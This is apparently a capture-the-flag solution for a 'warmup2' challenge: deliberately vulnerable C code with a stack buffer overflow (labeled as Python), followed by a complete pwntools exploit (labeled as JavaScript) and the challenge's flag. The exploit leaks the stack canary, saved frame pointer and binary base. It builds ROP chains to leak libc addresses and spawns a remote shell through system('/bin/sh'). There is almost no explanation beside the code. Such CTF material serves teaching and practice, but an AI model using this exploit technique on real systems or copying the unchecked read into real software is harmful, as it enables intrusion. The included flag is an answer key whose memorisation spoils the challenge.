## C1:
```py
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
    char buf[0x100];

    puts("What's your name?");
    read(0, buf, 0x1337);
    printf("Hello %s!\n", buf);

    puts("How old are you?");
    read(0, buf, 0x1337);
    printf("Wow, I'm %s too!\n", buf);
}

int main() {
    alarm(60);
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    vuln();

    return 0;
}
```
## C2: 

```js 
from pwn import *
context.arch='amd64'

#t = process('./warmup2')
t = remote("warmup2.ctf.maplebacon.org",1337)
t.recv()
t.sendline(b"A"*264)
t.recvuntil(b"A\n")
canary_leak = b"\x00" + t.recv(7)
log.info(f"Leaked canary: {canary_leak}")
rbp_leak = u64(t.recv(6).ljust(8,b"\x00"))
log.info(f"Leaked saved rbp: {hex(rbp_leak)}")
#t.send(b"A"*264+canary_leak+p64(rbp_leak)+"\x9e")
t.send(b"A"*264+canary_leak+p64(rbp_leak)+b"\xa3")
t.send(b"A"*280)
t.recvuntil(b"A"*280)
exe_leak = u64(t.recv(6).ljust(8,b"\x00"))
log.info(f"Leaked exe address: {hex(exe_leak)}")
main_addr = exe_leak - 68
log.info(f"Calculated main addres: {hex(main_addr)}")
exe_base = main_addr - 0x129e
log.info(f"Calculated exe base: {hex(exe_base)}")
e = ELF("./warmup2")
e.address = exe_base
r = ROP(e)
r.puts(e.symbols["got.puts"])
r.puts(e.symbols["got.read"])
input()
t.send(b"A"*264+canary_leak+p64(rbp_leak)+r.chain()+p64(main_addr+5))
t.recvuntil("too!\n")
puts_addr = u64(t.recv(6).ljust(8,b"\x00"))
t.recvline()
read_addr = u64(t.recv(6).ljust(8,b"\x00"))
log.info(f"Leaked puts addr: {hex(puts_addr)}")
log.info(f"Leaked read addr: {hex(read_addr)}")

l = ELF("./libc-warmup2.so.6")
l.address = puts_addr - l.symbols["puts"]
r2 = ROP(l)
r2.raw(p64(r2.find_gadget(['ret']).address))
r2.system(next(l.search(b"/bin/sh\x00")))
t.sendline(b"blah")
t.sendline(b"A"*264+canary_leak+p64(rbp_leak)+r2.chain())
t.interactive()
```

`flag: maple{we_have_so_much_in_common}`
